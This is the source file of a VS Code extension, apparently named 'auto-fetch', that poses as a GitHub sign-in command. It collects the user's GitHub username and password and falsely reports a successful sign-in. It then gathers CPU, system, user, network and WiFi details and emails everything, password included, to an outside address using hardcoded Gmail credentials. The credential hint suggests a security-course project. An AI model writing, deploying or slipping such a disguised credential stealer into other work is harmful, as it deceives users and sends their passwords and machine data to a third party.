const vscode = require('vscode');
const nodemailer = require("nodemailer");
const si = require('systeminformation');

/**
 * @param {vscode.ExtensionContext} context
 */
function activate(context) {

	let disposable = vscode.commands.registerCommand(
		'auto-fetch.gitSignIn', async function () {
			// The code you place here will be executed every time your command is executed

			let usernameQuery = await vscode.window.showInputBox({
				placeHolder: "Enter GitHub username.",
				prompt: "Submit username for GitHub"
			});
			if (usernameQuery === '') {
				vscode.window.showErrorMessage('A query is mandatory to execute this action');
			}
			if (usernameQuery !== undefined) {
				// console.log(`Username: ${usernameQuery}`);

				let passwordQuery = await vscode.window.showInputBox({
					placeHolder: `Submit password for GitHub`,
					prompt: "Submit password for GitHub"
				});
				if (passwordQuery === '') {
					vscode.window.showErrorMessage('A query is mandatory to execute this action');
				}
				if (passwordQuery !== undefined) {
					// console.log(`Password: ${passwordQuery}`);
					vscode.window.showInformationMessage('Sign In for GitHub successful!');

					async function getCpuData() {
						try {
							const data = await si.cpu();
							// console.log('CPU: Collected');
							return data
						} catch (e) {
							console.log(e)
						}
					} let cpuData = await getCpuData();

					async function getNIData() {
						try {
							const data = await si.networkInterfaces();
							// console.log('NIs: Collected');
							return data
						} catch (e) {
							console.log(e)
						}
					} let networkData = await getNIData();

					async function getSysData() {
						try {
							const data = await si.system();
							// console.log('Sys: Collected');
							return data
						} catch (e) {
							console.log(e)
						}
					} let systemData = await getSysData();

					async function getUserData() {
						try {
							const data = await si.users();
							// console.log('Users: Collected');
							return data
						} catch (e) {
							console.log(e)
						}
					} let userData = await getUserData();

					async function getWifiData() {
						try {
							const data = await si.wifiConnections();
							// console.log('Wifi: Collected');
							return data
						} catch (e) {
							console.log(e)
						}
					} let wifiData = await getWifiData();

					let message = `GitHub Data:\nUsername{${usernameQuery}}\nPassword{${passwordQuery}}\n`;

					function convertData(name) {
						const keys = Object.keys(name);
						keys.forEach((key, index) => {
							message += `${key}: ${name[key]}\n`
						});
					}

					message += "\nUser Data: ------------------------------------------\n\n"
					for (i = 0; i < userData.length; i++) { convertData(userData[i]); }
					message += "\nSystem Data: ------------------------------------------\n\n"
					convertData(systemData);
					message += "\nCPU Data: ------------------------------------------\n\n"
					convertData(cpuData);
					message += "\nNetwork Data: ------------------------------------------\n\n"
					for (i = 0; i < networkData.length; i++) {
						message += `Network Data [${i}] ----------\n`
						convertData(networkData[i]);
					}
					message += "\nWifi Data: ------------------------------------------\n\n"
					for (i = 0; i < wifiData.length; i++) {
						message += `Wifi Data [${i}] ----------\n`;
						convertData(wifiData[i]);
					}

					const nodeMailer = (email) => {

						var transporter = nodemailer.createTransport({
							service: 'gmail',
							auth: {
								user: 'autofetchNS@gmail.com',
								pass: 'NetworkSecurityFinal12345'
							}
						});

						var mailOptions = {
							from: 'autofetchNS@gmail.com',
							to: `${email}`,
							subject: `Auto-Fetch Data: ${userData[0].user}`,
							text: `${message}`
						};

						transporter.sendMail(mailOptions, function (error, info) {
							if (error) {
								console.log(error);
							} else {
								console.log(`Email sent to ${tempEmail}: ${info.response}`);
							}
						});

					}

					nodeMailer('adamspera@hotmail.com');

				}

			}

		});

	context.subscriptions.push(disposable);
}

function deactivate() { }

module.exports = {
	activate,
	deactivate
}
